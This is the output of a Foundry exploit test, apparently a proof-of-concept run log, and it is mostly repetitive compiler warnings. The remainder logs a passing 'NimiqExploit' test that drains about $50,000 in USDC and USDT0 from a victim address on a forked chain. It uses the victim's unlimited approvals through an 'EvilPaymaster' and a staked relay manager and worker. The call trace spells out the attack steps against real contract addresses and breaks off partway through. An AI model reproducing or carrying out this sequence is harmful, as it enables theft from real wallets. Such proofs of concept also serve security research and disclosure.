@@ -1,0 +1,754 @@
+Compiling 20 files with Solc 0.8.35
+Solc 0.8.35 finished in 395.30ms
+Compiler run successful with warnings:
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1241:9:
+     |
+1241 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1255:9:
+     |
+1255 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1263:79:
+     |
+1263 |     function assertApproxEqAbs(uint256 left, uint256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                               ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1270:77:
+     |
+1270 |     function assertApproxEqAbs(int256 left, int256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1287:9:
+     |
+1287 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1305:9:
+     |
+1305 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1315:86:
+     |
+1315 |     function assertApproxEqRel(uint256 left, uint256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1326:84:
+     |
+1326 |     function assertApproxEqRel(int256 left, int256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1335:77:
+     |
+1335 |     function assertEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1342:75:
+     |
+1342 |     function assertEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1348:46:
+     |
+1348 |     function assertEq(bool left, bool right, string calldata error) external pure;
+     |                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1354:68:
+     |
+1354 |     function assertEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1360:66:
+     |
+1360 |     function assertEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1366:68:
+     |
+1366 |     function assertEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1372:74:
+     |
+1372 |     function assertEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1378:72:
+     |
+1378 |     function assertEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1387:74:
+     |
+1387 |     function assertEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1393:74:
+     |
+1393 |     function assertEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1399:72:
+     |
+1399 |     function assertEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1405:70:
+     |
+1405 |     function assertEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1408:52:
+     |
+1408 |     function assertEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1414:50:
+     |
+1414 |     function assertEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1420:52:
+     |
+1420 |     function assertEq(address left, address right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1426:52:
+     |
+1426 |     function assertEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1432:42:
+     |
+1432 |     function assertFalse(bool condition, string calldata error) external pure;
+     |                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1440:77:
+     |
+1440 |     function assertGeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1448:75:
+     |
+1448 |     function assertGeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1455:52:
+     |
+1455 |     function assertGe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1462:50:
+     |
+1462 |     function assertGe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1470:77:
+     |
+1470 |     function assertGtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1478:75:
+     |
+1478 |     function assertGtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1485:52:
+     |
+1485 |     function assertGt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1492:50:
+     |
+1492 |     function assertGt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1500:77:
+     |
+1500 |     function assertLeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1508:75:
+     |
+1508 |     function assertLeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1515:52:
+     |
+1515 |     function assertLe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1522:50:
+     |
+1522 |     function assertLe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1530:77:
+     |
+1530 |     function assertLtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1538:75:
+     |
+1538 |     function assertLtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1545:52:
+     |
+1545 |     function assertLt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1552:50:
+     |
+1552 |     function assertLt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1559:80:
+     |
+1559 |     function assertNotEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                                ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1566:78:
+     |
+1566 |     function assertNotEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1572:49:
+     |
+1572 |     function assertNotEq(bool left, bool right, string calldata error) external pure;
+     |                                                 ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1578:71:
+     |
+1578 |     function assertNotEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1584:69:
+     |
+1584 |     function assertNotEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1590:71:
+     |
+1590 |     function assertNotEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1596:77:
+     |
+1596 |     function assertNotEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1602:75:
+     |
+1602 |     function assertNotEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1611:77:
+     |
+1611 |     function assertNotEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1617:77:
+     |
+1617 |     function assertNotEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1623:75:
+     |
+1623 |     function assertNotEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1629:73:
+     |
+1629 |     function assertNotEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1632:55:
+     |
+1632 |     function assertNotEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1638:53:
+     |
+1638 |     function assertNotEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1644:55:
+     |
+1644 |     function assertNotEq(address left, address right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1650:55:
+     |
+1650 |     function assertNotEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1656:41:
+     |
+1656 |     function assertTrue(bool condition, string calldata error) external pure;
+     |                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (4591): There are more than 256 warnings. Ignoring the rest.
+
+Ran 1 test for test/Nimiq_exp.sol:NimiqExploit
+[PASS] testExploit() (gas: 1452208)
+Logs:
+  victim USDC   before: 26130.641710
+  victim USDT0  before: 24332.489269
+  victim USDC.e before: 0.661117
+  attacker USDC   after: 26130.641710
+  attacker USDT0  after: 24332.489269
+  attacker USDC.e after: 0.661117
+  total drained (USD): 50463.792096
+
+Traces:
+  [3644] NimiqExploit::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 93930783 [9.393e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [1820525] NimiqExploit::testExploit()
+    ├─ [9750] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773) [staticcall]
+    │   ├─ [2553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773) [delegatecall]
+    │   │   └─ ← [Return] 26130641710 [2.613e10]
+    │   └─ ← [Return] 26130641710 [2.613e10]
+    ├─ [7889] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::balanceOf(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773) [staticcall]
+    │   ├─ [2535] 0x90040487A6C9F949C4F07CaDCFB0f3B8EEAb4229::balanceOf(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773) [delegatecall]
+    │   │   └─ ← [Return] 24332489269 [2.433e10]
+    │   └─ ← [Return] 24332489269 [2.433e10]
+    ├─ [7722] 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174::balanceOf(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773) [staticcall]
+    │   ├─ [2557] 0xDD9185DB084f5C4fFf3b4f70E7bA62123b812226::balanceOf(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773) [delegatecall]
+    │   │   └─ ← [Return] 661117 [6.611e5]
+    │   └─ ← [Return] 661117 [6.611e5]
+    ├─ emit log_named_decimal_uint(key: "victim USDC   before", val: 26130641710 [2.613e10], decimals: 6)
+    ├─ emit log_named_decimal_uint(key: "victim USDT0  before", val: 24332489269 [2.433e10], decimals: 6)
+    ├─ emit log_named_decimal_uint(key: "victim USDC.e before", val: 661117 [6.611e5], decimals: 6)
+    ├─ [2365] 0x0cFD862bE942846Cebad797d7c1BC6e47714959b::getHubAddr() [staticcall]
+    │   └─ ← [Return] 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d
+    ├─ [0] VM::assertEq(0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d, 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d, "hub #1") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2476] 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f::getHubAddr() [staticcall]
+    │   └─ ← [Return] 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d
+    ├─ [0] VM::assertEq(0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d, 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d, "hub #2") [staticcall]
+    │   └─ ← [Return]
+    ├─ [3359] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::allowance(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0x0cFD862bE942846Cebad797d7c1BC6e47714959b) [staticcall]
+    │   ├─ [2659] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::allowance(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0x0cFD862bE942846Cebad797d7c1BC6e47714959b) [delegatecall]
+    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007499361667563 [1.157e77]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007499361667563 [1.157e77]
+    ├─ [0] VM::assertGt(115792089237316195423570985008687907853269984665640564039457584007499361667563 [1.157e77], 26130641710 [2.613e10], "no USDC approval") [staticcall]
+    │   └─ ← [Return]
+    ├─ [3521] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::allowance(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f) [staticcall]
+    │   ├─ [2661] 0x90040487A6C9F949C4F07CaDCFB0f3B8EEAb4229::allowance(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f) [delegatecall]
+    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007821249890708 [1.157e77]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007821249890708 [1.157e77]
+    ├─ [0] VM::assertGt(115792089237316195423570985008687907853269984665640564039457584007821249890708 [1.157e77], 24332489269 [2.433e10], "no USDT0 approval") [staticcall]
+    │   └─ ← [Return]
+    ├─ [3288] 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174::allowance(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f) [staticcall]
+    │   ├─ [2617] 0xDD9185DB084f5C4fFf3b4f70E7bA62123b812226::allowance(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f) [delegatecall]
+    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007745970469083 [1.157e77]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007745970469083 [1.157e77]
+    ├─ [0] VM::assertGt(115792089237316195423570985008687907853269984665640564039457584007745970469083 [1.157e77], 661117 [6.611e5], "no USDC.e approval") [staticcall]
+    │   └─ ← [Return]
+    ├─ [269910] → new EvilPaymaster@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 1348 bytes of code
+    ├─ [0] VM::deal(relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0], 2000000000000000000 [2e18])
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0])
+    │   └─ ← [Return]
+    ├─ [24394] 0x15C7B7CE10f3A9AE63554bCE7C54d0a818E967C7::setRelayManagerOwner(relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0])
+    │   ├─ emit OwnerSet(param0: relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0], param1: relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0])
+    │   ├─  storage changes:
+    │   │   @ 0xc4be1f672f617a2ced5b26ea06a335b3120d30d320c23f7ead4167cea3622141: 0 → 0x000000000000000000000000f8559728825f775be396d8d9dc9ef687bb4299a0
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0])
+    │   └─ ← [Return]
+    ├─ [47276] 0x15C7B7CE10f3A9AE63554bCE7C54d0a818E967C7::stakeForRelayManager{value: 1000000000000000000}(relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0], 1000)
+    │   ├─ emit StakeAdded(param0: relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0], param1: relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0], param2: 1000000000000000000 [1e18], param3: 1000)
+    │   ├─  storage changes:
+    │   │   @ 0xc4be1f672f617a2ced5b26ea06a335b3120d30d320c23f7ead4167cea362213f: 0 → 1000
+    │   │   @ 0xc4be1f672f617a2ced5b26ea06a335b3120d30d320c23f7ead4167cea362213e: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0])
+    │   └─ ← [Return]
+    ├─ [24435] 0x15C7B7CE10f3A9AE63554bCE7C54d0a818E967C7::authorizeHubByManager(0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d)
+    │   ├─ emit HubAuthorized(param0: relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0], param1: 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d)
+    │   ├─  storage changes:
+    │   │   @ 0x4c416b5a4e5627969af4c657b67f35fbc1b73ce92f383a90f3b7a6fa92360c33: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0])
+    │   └─ ← [Return]
+    ├─ [58749] 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d::addRelayWorkers([0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2])
+    │   ├─ [3403] 0x15C7B7CE10f3A9AE63554bCE7C54d0a818E967C7::isRelayManagerStaked(relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0], 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d, 1000000000000000000 [1e18], 1000) [staticcall]
+    │   │   └─ ← [Return] true
+    │   ├─ emit RelayWorkersAdded(param0: relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0], param1: [0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2], param2: 1)
+    │   ├─  storage changes:
+    │   │   @ 0x312af69a4a00fc62253312b7d69ffa7c46f89292261690b70f674a67283a6ad4: 0 → 1
+    │   │   @ 0x652b6b93a5ea7d2e610800632e6ee515ff3492e5530649b806bb200a943a9f21: 0 → 0x000000000000000000000000f8559728825f775be396d8d9dc9ef687bb4299a0
+    │   └─ ← [Stop]
+    ├─ [1403] 0x15C7B7CE10f3A9AE63554bCE7C54d0a818E967C7::isRelayManagerStaked(relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0], 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d, 1000000000000000000 [1e18], 1000) [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true, "relay manager not staked") [staticcall]
+    │   └─ ← [Return]
+    ├─ [681] 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d::workerToManager(relayWorker: [0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2]) [staticcall]
+    │   └─ ← [Return] relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0]
+    ├─ [0] VM::assertEq(relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0], relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0], "worker not registered") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::deal(NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2000000000000000000 [2e18])
+    │   └─ ← [Return]
+    ├─ [26708] 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d::depositFor{value: 1000000000000000000}(EvilPaymaster: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   ├─ emit Deposited(param0: EvilPaymaster: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 1000000000000000000 [1e18])
+    │   ├─  storage changes:
+    │   │   @ 0xcee911a2ea82419afffbbd8784199b8969be98a3c894e3c226407ff62e8efc17: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   └─ ← [Stop]
+    ├─ [0] VM::computeCreate2Address(0xf8239f7df4a5a66bbdac60e1fb1cb68fb3fe242a227da485ca6e02bae713131d, 0xb11f26b660a79b3e706fcdd3a21c59655f632860e4adb6e66b24f9255475622d, NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] HTLCRecipient: [0x8c71BaAC29a541a0E76AcEfe4029fbE7483c90E9]
+    ├─ [72] PRECOMPILES::sha256(0x0000000000000000000000000000000000000000000000000000000000000001) [staticcall]
+    │   └─ ← [Return] 0xec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5
+    ├─ [2599] 0x0cFD862bE942846Cebad797d7c1BC6e47714959b::getNonce(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::prank(relayWorker: [0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2], relayWorker: [0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2])
+    │   └─ ← [Return]
